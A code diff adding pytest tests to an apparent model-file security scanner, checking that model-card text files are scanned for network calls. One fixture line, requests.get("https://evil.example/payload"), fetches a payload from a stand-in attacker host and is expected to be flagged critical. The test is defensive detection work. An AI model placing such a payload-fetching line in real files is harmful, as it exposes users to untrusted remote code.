@@ -65,6 +65,43 @@ def test_text_scanner_documentation_urls_are_informational(tmp_path: Path) -> No
     assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
 
 
+@pytest.mark.parametrize("filename", ["model_card.txt", "modelcard.md"])
+def test_text_scanner_model_card_aliases_preserve_executable_network_findings(
+    tmp_path: Path,
+    filename: str,
+) -> None:
+    text_path = tmp_path / filename
+    text_path.write_text('requests.get("https://evil.example/payload")\n', encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert TextScanner.can_handle(str(text_path))
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "network_function"
+        and check.details.get("function") == "requests.get"
+        and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+@pytest.mark.parametrize("filename", ["model_card.txt", "modelcard.md"])
+def test_text_scanner_model_card_aliases_keep_documentation_urls_informational(
+    tmp_path: Path,
+    filename: str,
+) -> None:
+    text_path = tmp_path / filename
+    text_path.write_text("Documentation: https://docs.example.com/model-card\n", encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
+    assert determine_exit_code(aggregate) == 0
+
+
 @pytest.mark.parametrize(
     "content",
     [
